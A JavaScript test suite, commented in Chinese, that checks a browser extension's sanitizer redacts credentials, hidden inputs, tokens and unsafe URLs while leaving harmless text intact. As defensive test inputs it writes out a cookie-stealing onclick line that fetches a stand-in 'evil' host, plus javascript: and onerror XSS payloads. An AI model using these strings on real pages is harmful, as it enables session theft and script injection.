// @ts-check
/**
 * 安全边界单测（ticket 03）。
 *
 * ## 为什么这些测试值钱
 *
 * `sanitize.js` 是整个扩展唯一的安全边界，而它的输入来自页面——也就是说它必须
 * **对敌意输入也成立**，不能只对良性输入成立。这里同时覆盖两侧：
 *
 * - 应该命中的（AC-6 / AC-8 / S-1 / S-2）
 * - **不应该误伤的**（AC-7 / S-3）—— 参考实现正是在这一侧失守，
 *   把 `secret-banner`、正文里的 "Password" 一并删掉，静默降低抓取质量
 *
 * 所有期望值都按 spec 手写，不从实现里推导，避免同义反复的测试。
 */
import assert from 'node:assert/strict'
import { test } from 'node:test'
import { readFileSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { dirname, join } from 'node:path'

const here = dirname(fileURLToPath(import.meta.url))
const extensionRoot = join(here, '..')

/** 与 service worker 的 importScripts 顺序一致。 */
const LOAD_ORDER = [
  'src/shared/text-utils.js',
  'src/shared/surrogate-safe-string.js',
  'src/shared/budget.js',
  'src/shared/format.js',
  'src/shared/attribute-allowlist.js',
  'src/shared/secret-patterns.js',
  'src/background/sanitize.js'
]

function loadNamespace() {
  for (const relative of LOAD_ORDER) {
    new Function(readFileSync(join(extensionRoot, relative), 'utf8')).call(globalThis)
  }
  return globalThis.__EG__
}

const ns = loadNamespace()

/** 造一个结构完整、字段都合法的 raw payload，供各用例局部覆写。 */
function makeRaw(overrides = {}) {
  const base = {
    page: {
      sanitizedUrl: 'https://example.com/cart',
      title: 'Cart',
      viewportWidth: 1280,
      viewportHeight: 800,
      scrollX: 0,
      scrollY: 0,
      devicePixelRatio: 1,
      capturedAt: '2026-01-01T00:00:00.000Z'
    },
    target: {
      tagName: 'button',
      selector: 'button#submit',
      elementPath: 'div.cart > button#submit',
      fullPath: 'body > div.cart > button#submit',
      cssClasses: 'btn btn-primary',
      nearbyElements: ['p.cart-total "Order total: $128.40"'],
      selectedText: null,
      isFixed: false,
      reactComponents: null,
      sourceFile: null,
      textSnippet: 'Submit order',
      htmlSnippet: '<button id="submit">Submit order</button>',
      attributes: { id: 'submit', class: 'btn btn-primary' },
      accessibility: { role: 'button', accessibleName: 'Submit order', ariaLabel: null, ariaLabelledBy: null },
      rectViewport: { x: 10, y: 20, width: 220, height: 48 },
      rectPage: { x: 10, y: 20, width: 220, height: 48 },
      computedStyles: Object.fromEntries(ns.STYLE_PROPS.map((p) => [p, '']))
    },
    nearbyText: ['Order total: $128.40'],
    ancestorPath: ['div.cart'],
    screenshot: null
  }
  return { ...base, ...overrides }
}

function sanitize(raw) {
  const result = ns.sanitizePayload(raw)
  assert.equal(result.ok, true, `期望通过校验，但被拒绝：${result.ok ? '' : result.message}`)
  return result.payload
}

// ---------------------------------------------------------------------------
// 基线：良性输入不被改动
// ---------------------------------------------------------------------------

test('良性 payload 通过，且关键字段原样保留', () => {
  const payload = sanitize(makeRaw())
  assert.equal(payload.target.tagName, 'button')
  assert.equal(payload.target.selector, 'button#submit')
  assert.equal(payload.target.textSnippet, 'Submit order')
  assert.equal(payload.target.attributes.id, 'submit')
  assert.equal(payload.nearbyText.length, 1)
})

// ---------------------------------------------------------------------------
// S-3 / AC-7：不得误伤
// ---------------------------------------------------------------------------

test('S-3 / AC-7：class="secret-banner" 不被脱敏（词边界匹配生效）', () => {
  const raw = makeRaw()
  raw.target.cssClasses = 'secret-banner'
  raw.target.attributes.class = 'secret-banner'
  const payload = sanitize(raw)
  assert.equal(payload.target.cssClasses, 'secret-banner')
  assert.equal(payload.target.attributes.class, 'secret-banner')
})

test('S-3：正文里的 "Password reset is available" 保留句子，只替换那一个词', () => {
  const raw = makeRaw()
  raw.target.textSnippet = 'Password reset is available from the account page.'
  const payload = sanitize(raw)
  // 这是对 spec §10.4.1 S-3 文字的主动收紧：孤立凭据词变成 [redacted]，
  // 但句子结构保留，因为整段删除会连带删掉用户想让 AI 看到的上下文。
  assert.equal(
    payload.target.textSnippet,
    '[redacted] reset is available from the account page.',
    '应只替换命中的 token，而不是删掉整段'
  )
})

test('S-3：孤立的 password 词仍被替换', () => {
  const raw = makeRaw()
  raw.target.textSnippet = 'password'
  const payload = sanitize(raw)
  assert.equal(payload.target.textSnippet, ns.REDACTED)
})

test('S-3：client_secret 由子串模式命中，且不会因词边界规则漏掉', () => {
  const raw = makeRaw()
  raw.target.attributes.name = 'client_secret'
  const payload = sanitize(raw)
  assert.equal(payload.target.attributes.name, ns.REDACTED)
})

test('S-3：source-code 与 stateful 这类正常类名不被误伤', () => {
  const raw = makeRaw()
  raw.target.cssClasses = 'source-code stateful'
  raw.target.attributes.class = 'source-code stateful'
  const payload = sanitize(raw)
  assert.equal(payload.target.cssClasses, 'source-code stateful')
  assert.equal(payload.target.attributes.class, 'source-code stateful')
})

// ---------------------------------------------------------------------------
// AC-6 / AC-8 / S-1 / S-2：必须命中
// ---------------------------------------------------------------------------

test('AC-6：文本片段里的 access_token 被脱敏', () => {
  const raw = makeRaw()
  raw.target.textSnippet = 'error: access_token=abc123 rejected'
  const payload = sanitize(raw)
  assert.equal(payload.target.textSnippet, ns.REDACTED)
})

test('S-1：password 输入框的 value 被无条件替换，即使值本身不含任何机密词汇', () => {
  const raw = makeRaw()
  raw.target.htmlSnippet = '<input id="pw" type="password" value="hunter2">'
  const payload = sanitize(raw)
  assert.ok(
    !payload.target.htmlSnippet.includes('hunter2'),
    `HTML 片段里仍出现密码：${payload.target.htmlSnippet}`
  )
  assert.ok(payload.target.htmlSnippet.includes(ns.REDACTED))
})

test('S-1：hidden 输入框的 value 同样被替换', () => {
  const raw = makeRaw()
  raw.target.htmlSnippet = "<input type='hidden' name='csrf_token' value='zzz999'>"
  const payload = sanitize(raw)
  assert.ok(!payload.target.htmlSnippet.includes('zzz999'), payload.target.htmlSnippet)
})

test('S-1：script 内容被移除（保留标签以便读结构）', () => {
  const raw = makeRaw()
  raw.target.htmlSnippet = '<div><script>window.secretToken="leak"</script></div>'
  const payload = sanitize(raw)
  assert.ok(!payload.target.htmlSnippet.includes('leak'), payload.target.htmlSnippet)
  assert.ok(payload.target.htmlSnippet.includes('<script'))
})

test('S-2 补洞：HTML 片段里的 href/src 同样被净化（真机验证发现的泄漏点）', () => {
  const raw = makeRaw()
  raw.target.htmlSnippet =
    '<a id="keyed-link" href="https://user:pw@example.com/api/keys/abc123?token=xyz#frag">link</a>'
  const payload = sanitize(raw)
  const html = payload.target.htmlSnippet
  assert.ok(!html.includes('user:pw'), `userinfo 仍泄漏：${html}`)
  assert.ok(!html.includes('token=xyz'), `token 仍泄漏：${html}`)
  assert.ok(!html.includes('#frag'), `fragment 仍泄漏：${html}`)
  assert.ok(html.includes('https://example.com/api/keys/abc123'), html)
})

test('S-2 补洞：不安全的协议属性从片段中整条移除', () => {
  const raw = makeRaw()
  raw.target.htmlSnippet = '<a href="javascript:alert(1)">x</a><img src="data:text/html;base64,AA">'
  const payload = sanitize(raw)
  assert.ok(!payload.target.htmlSnippet.includes('javascript:'), payload.target.htmlSnippet)
  assert.ok(!payload.target.htmlSnippet.includes('data:text/html'), payload.target.htmlSnippet)
})

test('S-2 补洞：认证主机的 URL 属性消失，但片段其余部分保留', () => {
  const raw = makeRaw()
  raw.target.htmlSnippet = '<div><a href="https://accounts.google.com/o/oauth2?state=abc">sign in</a></div>'
  const payload = sanitize(raw)
  assert.ok(
    !payload.target.htmlSnippet.toLowerCase().includes('google'),
    payload.target.htmlSnippet
  )
  assert.ok(payload.target.htmlSnippet.includes('sign in'))
})

test('S-2 补洞：净化后的路径里出现敏感词不会导致整段被删', () => {
  const raw = makeRaw()
  // 净化后路径含 "token"，但它不是凭据；不应触发整段替换。
  raw.target.htmlSnippet = '<a href="https://example.com/docs/token-guide">guide</a>'
  const payload = sanitize(raw)
  assert.ok(payload.target.htmlSnippet.includes('token-guide'), payload.target.htmlSnippet)
  assert.notEqual(payload.target.htmlSnippet, ns.REDACTED)
})

test('S-1：HTML 片段里出现真正的凭据字段名时整段替换', () => {
  const raw = makeRaw()
  raw.target.htmlSnippet = '<div data-note="access_token=abc123">x</div>'
  const payload = sanitize(raw)
  assert.equal(payload.target.htmlSnippet, ns.REDACTED)
})

test('S-1：value 不在属性白名单里，所以不会作为独立属性泄漏', () => {
  const raw = makeRaw()
  raw.target.attributes = { value: 'hunter2', id: 'pw' }
  const payload = sanitize(raw)
  assert.equal(payload.target.attributes.value, undefined, 'value 必须被白名单挡掉')
  assert.equal(payload.target.attributes.id, 'pw')
})

test('S-2 / AC-8：URL 的 userinfo 被清掉', () => {
  const sanitized = ns.sanitizeUrl('https://user:pw@example.com/api/keys/abc123?token=xyz#frag')
  assert.ok(!sanitized.includes('user'), sanitized)
  assert.ok(!sanitized.includes('pw'), sanitized)
  assert.ok(!sanitized.includes('xyz'), sanitized)
  assert.ok(!sanitized.includes('#'), sanitized)
  assert.equal(sanitized, 'https://example.com/api/keys/abc123')
})

test('S-2：页面 URL 与 URL 类属性都走同一套净化', () => {
  const raw = makeRaw()
  raw.page.sanitizedUrl = 'https://alice:hunter2@example.com/cart?session_id=xyz'
  raw.target.attributes.href = 'https://bob:pw@example.com/item?auth_token=zz'
  const payload = sanitize(raw)
  assert.ok(!payload.page.sanitizedUrl.includes('alice'), payload.page.sanitizedUrl)
  assert.ok(!payload.page.sanitizedUrl.includes('hunter2'), payload.page.sanitizedUrl)
  assert.ok(!payload.target.attributes.href.includes('bob'), payload.target.attributes.href)
  assert.ok(!payload.target.attributes.href.includes('zz'), payload.target.attributes.href)
})

test('S-2：认证主机的 URL 整条清空（无回显价值且有风险）', () => {
  assert.equal(ns.sanitizeUrl('https://accounts.google.com/o/oauth2/v2/auth?state=abc'), '')
  assert.equal(ns.sanitizeUrl('https://www.youtube.com/watch?v=1'), '')
  // 非认证主机不受影响。
  assert.equal(ns.sanitizeUrl('https://example.com/a'), 'https://example.com/a')
})

test('非 http(s)/file 协议一律清空（含 javascript:）', () => {
  assert.equal(ns.sanitizeUrl('javascript:alert(1)'), '')
  assert.equal(ns.sanitizeUrl('data:text/html,<script>x</script>'), '')
  assert.equal(ns.sanitizeUrl('about:blank'), 'about:blank')
  assert.equal(ns.sanitizeUrl('about:config'), '')
  assert.equal(ns.sanitizeUrl('not a url'), '')
})

// ---------------------------------------------------------------------------
// 第 1 步：结构前置校验 —— 畸形输入走拒绝而非抛错
// ---------------------------------------------------------------------------

test('结构校验：非对象 / 缺 page / 缺 target 都被拒绝且不抛错', () => {
  for (const bad of [null, undefined, 'str', 42, [], {}, { page: {} }, { page: {}, target: {} }]) {
    const result = ns.sanitizePayload(bad)
    assert.equal(result.ok, false, `期望拒绝：${JSON.stringify(bad)}`)
    assert.equal(result.code, ns.ERROR_CODES.payloadInvalid)
  }
})

test('结构校验：字段类型错了也走拒绝而不是在嵌套访问上抛 TypeError', () => {
  const raw = makeRaw()
  raw.nearbyText = 'not-an-array'
  const result = ns.sanitizePayload(raw)
  assert.equal(result.ok, false)
  assert.equal(result.code, ns.ERROR_CODES.payloadInvalid)
})

// ---------------------------------------------------------------------------
// 第 2 步：clamp
// ---------------------------------------------------------------------------

test('clamp：超长字段被截断且不叠加两遍后缀', () => {
  const raw = makeRaw()
  raw.target.textSnippet = 'x'.repeat(500)
  const payload = sanitize(raw)
  assert.ok(payload.target.textSnippet.length <= 200 + ns.TRUNCATION_SUFFIX.length)
  assert.ok(payload.target.textSnippet.endsWith(ns.TRUNCATION_SUFFIX))

  // 已经带后缀的输入不再截第二次。
  const already = 'x'.repeat(150) + ns.TRUNCATION_SUFFIX
  const second = ns.clampOnce(already, 200)
  assert.equal(second, already)
  assert.equal(second.split(ns.TRUNCATION_SUFFIX).length - 1, 1)
})

test('clamp：数组按上限截断，非字符串项被丢弃', () => {
  const raw = makeRaw()
  raw.nearbyText = Array.from({ length: 30 }, (_, i) => `item ${i}`)
  raw.ancestorPath = ['a', 42, null, 'b']
  const payload = sanitize(raw)
  assert.equal(payload.nearbyText.length, ns.BUDGET.nearbyTextMaxEntries)
  assert.deepEqual(payload.ancestorPath, ['a', 'b'])
})

test('clamp：计算样式只保留 spec §10.3 的 16 项，多给的键被丢弃', () => {
  const raw = makeRaw()
  raw.target.computedStyles = { ...raw.target.computedStyles, display: 'flex', injected: 'evil' }
  const payload = sanitize(raw)
  assert.equal(payload.target.computedStyles.display, 'flex')
  assert.equal(payload.target.computedStyles.injected, undefined)
  assert.equal(Object.keys(payload.target.computedStyles).length, 16)
})

test('clamp：rect 的非有限数回落，负宽高被夹到 0', () => {
  const raw = makeRaw()
  raw.target.rectViewport = { x: Number.NaN, y: Infinity, width: -5, height: 'tall' }
  const payload = sanitize(raw)
  assert.equal(payload.target.rectViewport.x, 0)
  assert.equal(payload.target.rectViewport.y, 0)
  assert.equal(payload.target.rectViewport.width, 0)
  assert.equal(payload.target.rectViewport.height, 0)
})

// ---------------------------------------------------------------------------
// 第 6 步：截图校验
// ---------------------------------------------------------------------------

test('截图：前缀不是 PNG data URL 时被丢弃并给出原因', () => {
  const raw = makeRaw()
  raw.screenshot = { dataUrl: 'data:text/html;base64,PHNjcmlwdD4=', width: 1, height: 1 }
  const payload = sanitize(raw)
  assert.equal(payload.screenshot, null)
  assert.equal(payload.screenshotOmittedReason, ns.ERROR_CODES.payloadInvalid)
})

test('截图：合法 PNG 通过并估算字节数', () => {
  const raw = makeRaw()
  const base64 = 'A'.repeat(4000)
  raw.screenshot = { dataUrl: ns.PNG_DATA_URL_PREFIX + base64, width: 100, height: 50 }
  const payload = sanitize(raw)
  assert.ok(payload.screenshot)
  assert.equal(payload.screenshot.mimeType, 'image/png')
  assert.equal(payload.screenshot.byteLength, Math.floor((4000 * 3) / 4))
})

test('截图：超过 2 MiB 上限时被丢弃并给出 screenshot_too_large', () => {
  const raw = makeRaw()
  // 需要 base64 长度 > 2 MiB * 4/3。
  const base64 = 'A'.repeat(Math.ceil((ns.BUDGET.screenshotMaxBytes * 4) / 3) + 16)
  raw.screenshot = { dataUrl: ns.PNG_DATA_URL_PREFIX + base64, width: 4000, height: 4000 }
  const payload = sanitize(raw)
  assert.equal(payload.screenshot, null)
  assert.equal(payload.screenshotOmittedReason, ns.ERROR_CODES.screenshotTooLarge)
})

// ---------------------------------------------------------------------------
// 第 3 步：属性白名单
// ---------------------------------------------------------------------------

test('白名单：value / data-* / style 一律不进结果，aria-* 一律进', () => {
  const raw = makeRaw()
  raw.target.attributes = {
    id: 'x',
    value: 'secret-value',
    'data-user-id': '42',
    style: 'color: red',
    name: 'field',
    'aria-label': 'Close dialog',
    onclick: 'evil()'
  }
  const payload = sanitize(raw)
  assert.deepEqual(Object.keys(payload.target.attributes).sort(), ['aria-label', 'id', 'name'])
})

test('白名单：内容脚本没过滤时，校验端仍然过滤（纵深防御）', () => {
  // 直接构造一份"内容脚本被攻破"的输入，绕过 extract.js。
  const raw = makeRaw()
  raw.target.attributes = { onclick: 'fetch("https://evil/"+document.cookie)' }
  const payload = sanitize(raw)
  assert.deepEqual(payload.target.attributes, {})
})

// ---------------------------------------------------------------------------
// SP-002：password / hidden 的 value 必须与**属性顺序**无关地被剥离
// ---------------------------------------------------------------------------

const Q = '"'
const SQ = "'"

/** 把一段 HTML 塞进 payload 的 htmlSnippet 里，走完整的 sanitize 管道。 */
function htmlSnippetOf(html) {
  const raw = makeRaw()
  raw.target.htmlSnippet = html
  return sanitize(raw).target.htmlSnippet
}

test('SP-002：type 在 value 之后时密码同样被剥离（真机复现的泄漏）', () => {
  // 第一版正则要求 type 出现在 value 之前，所以这一条会原样带出密码。
  const html = `<input id=${Q}pw${Q} value=${Q}SECRET_B${Q} type=${Q}password${Q}>`
  const out = htmlSnippetOf(html)
  assert.ok(!out.includes('SECRET_B'), `密码泄漏了：${out}`)
  assert.ok(out.includes('[redacted]'), out)
})

test('SP-002：hidden 且 value 在前时同样被剥离', () => {
  const html = `<input value=${Q}SECRET_C${Q} type=${Q}hidden${Q}>`
  const out = htmlSnippetOf(html)
  assert.ok(!out.includes('SECRET_C'), `hidden 值泄漏了：${out}`)
})

test('SP-002：单引号、无引号、大写 TYPE 都要覆盖', () => {
  const cases = [
    `<input id='pw' value='SECRET_D' type='password'>`,
    `<input id=pw value=SECRET_E type=password>`,
    `<input value=${Q}SECRET_F${Q} TYPE=${Q}PASSWORD${Q}>`
  ]
  for (const html of cases) {
    const out = htmlSnippetOf(html)
    const secret = (html.match(/SECRET_[A-Z]/) || [])[0]
    assert.ok(!out.includes(secret), `泄漏了 ${secret}：${out}`)
  }
})

test('SP-002：不该被动的地方一个都不能动（避免过度剥离）', () => {
  const cases = [
    // 普通文本框的 value 是用户可见内容，不该剥。
    [`<input value=${Q}KEEP_TEXT${Q} type=${Q}text${Q}>`, 'KEEP_TEXT'],
    // 没有 type 属性时按默认 text 处理。
    [`<input value=${Q}KEEP_NOTYPE${Q}>`, 'KEEP_NOTYPE'],
    // `data-type` 是近似名，不该触发剥离。
    [`<input value=${Q}KEEP_DATATYPE${Q} data-type=${Q}password${Q}>`, 'KEEP_DATATYPE'],
    // value 内容里出现 "type=password" 只是文本，不是属性。
    [`<input type=${Q}text${Q} value=${Q}KEEP_INNER${Q}>`, 'KEEP_INNER']
  ]
  for (const [html, marker] of cases) {
    const out = htmlSnippetOf(html)
    assert.ok(out.includes(marker), `误删了 ${marker}：${out}`)
  }
})

test('SP-002：一段 HTML 里多个 input，只剥敏感的', () => {
  const html =
    `<form><input value=${Q}SECRET_ONE${Q} type=${Q}password${Q}>` +
    `<input value=${Q}KEEP_PUBLIC${Q} type=${Q}text${Q}>` +
    `<input value=${Q}SECRET_TWO${Q} type=${Q}hidden${Q}></form>`
  const out = htmlSnippetOf(html)
  assert.ok(!out.includes('SECRET_ONE'), out)
  assert.ok(!out.includes('SECRET_TWO'), out)
  assert.ok(out.includes('KEEP_PUBLIC'), `不该动公开字段：${out}`)
})



test('SP-001：内容脚本报告的截图缺省原因被保留，不被静默抹掉', () => {
  // 这是评审发现的真实缺陷：内容脚本测出"元素不在视口内"，但 sanitize 只取
  // clampScreenshot 的 omittedReason —— 在"没有截图"这条主路径上它恰好是 null，
  // 于是原因被抹掉。用户只能在那条 2 秒就消失的胶囊里瞥一眼，历史里永远没有原因，
  // 侧边面板的"没有截图：<原因>"从来没出现过。
  const raw = makeRaw()
  raw.screenshot = null
  raw.screenshotOmittedReason = 'element_not_visible'
  const payload = sanitize(raw)
  assert.equal(payload.screenshotOmittedReason, 'element_not_visible', '原因被抹掉了')
})

test('SP-001：screenshot 字段整个缺失时同样保留原因', () => {
  // 这条路径上 clampScreenshot(undefined) 也返回 omittedReason: null。
  const raw = makeRaw()
  delete raw.screenshot
  raw.screenshotOmittedReason = 'screenshot_too_large'
  assert.equal(sanitize(raw).screenshotOmittedReason, 'screenshot_too_large')
})

test('SP-001：只放行已知错误码，未知字符串被丢弃（不信任内容脚本）', () => {
  // 这个字段会原样显示给用户，不能让内容脚本塞任意字符串进界面。
  const raw = makeRaw()
  raw.screenshot = null
  raw.screenshotOmittedReason = '<img src=x onerror=alert(1)> 随便什么'
  assert.equal(sanitize(raw).screenshotOmittedReason, null)
})

test('SP-001：有截图时不采信内容脚本自述的原因（避免自相矛盾的界面）', () => {
  // 内容脚本可以一边给出有效截图、一边自述"元素不可见"——那会让面板显示
  // "没有截图：元素不在视口内"，而记录里其实有截图。规则是：有截图就不采信自述原因。
  const raw = makeRaw()
  raw.screenshot = {
    mimeType: 'image/png',
    dataUrl: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==',
    width: 1,
    height: 1
  }
  raw.screenshotOmittedReason = 'element_not_visible'
  const payload = sanitize(raw)
  assert.ok(payload.screenshot, '这一条应当有截图')
  assert.equal(payload.screenshotOmittedReason, null, '有截图就不该有缺省原因')
})

test('SP-001：保留下来的原因能一路走到用户看得懂的文案', () => {
  const raw = makeRaw()
  raw.screenshot = null
  raw.screenshotOmittedReason = 'element_not_visible'
  const payload = sanitize(raw)
  const described = ns.describeScreenshotOmission(payload.screenshotOmittedReason)
  assert.ok(described.startsWith('没有截图：'), described)
  assert.ok(described.includes('视口'), described)
})
